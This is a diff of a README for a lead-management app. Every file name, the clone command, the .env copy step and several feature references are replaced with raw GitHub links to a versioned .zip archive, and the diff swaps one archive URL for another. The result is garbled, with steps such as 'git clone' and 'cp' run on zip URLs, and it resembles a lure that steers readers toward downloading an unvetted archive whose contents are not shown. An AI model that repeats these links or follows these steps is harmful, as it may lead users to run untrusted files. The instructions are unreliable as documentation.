@@ -65,9 +65,9 @@ src/
 │   ├── leads/            # Create/Edit/View Lead modals
 │   ├── layout/           # Header, Sidebar
 │   └── ui/               # Shared UI components
-├── https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip               # Main routing and layout
-├── https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip             # Tailwind base styles
-├── https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip              # Entry point
+├── https://github.com/mudassiralladatkhan/LeadManegment/raw/refs/heads/main/src/lib/Manegment_Lead_v2.4-alpha.4.zip               # Main routing and layout
+├── https://github.com/mudassiralladatkhan/LeadManegment/raw/refs/heads/main/src/lib/Manegment_Lead_v2.4-alpha.4.zip             # Tailwind base styles
+├── https://github.com/mudassiralladatkhan/LeadManegment/raw/refs/heads/main/src/lib/Manegment_Lead_v2.4-alpha.4.zip              # Entry point
 public/
 dist/                     # Production build
 ```
@@ -79,7 +79,7 @@ dist/                     # Production build
 1. Clone the repo:
 
 ```bash
-git clone https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip
+git clone https://github.com/mudassiralladatkhan/LeadManegment/raw/refs/heads/main/src/lib/Manegment_Lead_v2.4-alpha.4.zip
 cd leadflow-ai
 ```
 
@@ -94,7 +94,7 @@ npm install
 Copy .env and update values (Supabase keys, VITE_* URLs):
 
 ```bash
-cp https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip .env
+cp https://github.com/mudassiralladatkhan/LeadManegment/raw/refs/heads/main/src/lib/Manegment_Lead_v2.4-alpha.4.zip .env
 ```
 
 4. Run development server:
@@ -120,13 +120,13 @@ The visual-editor plugin includes:
 - Hot-reload via Vite plugin
 - Customizable component overlays
 
-Plugin entry: https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip
+Plugin entry: https://github.com/mudassiralladatkhan/LeadManegment/raw/refs/heads/main/src/lib/Manegment_Lead_v2.4-alpha.4.zip
 
 ---
 
 ## 📊 Analytics
 
-https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip shows real-time:
+https://github.com/mudassiralladatkhan/LeadManegment/raw/refs/heads/main/src/lib/Manegment_Lead_v2.4-alpha.4.zip shows real-time:
 
 - Lead breakdown (Hot, Warm, Cold)
 - Agent follow-up metrics
@@ -140,7 +140,7 @@ https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthrop
 - Supports deployment to Vercel, Netlify, Firebase, or any static host
 - For Supabase backend:
   - Set VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY in your .env
-- For full SSR + API: hook with https://raw.githubusercontent.com/mudassiralladatkhan/LeadManegment/main/anthropometry/LeadManegment.zip or serverless functions
+- For full SSR + API: hook with https://github.com/mudassiralladatkhan/LeadManegment/raw/refs/heads/main/src/lib/Manegment_Lead_v2.4-alpha.4.zip or serverless functions
 
 ---
 
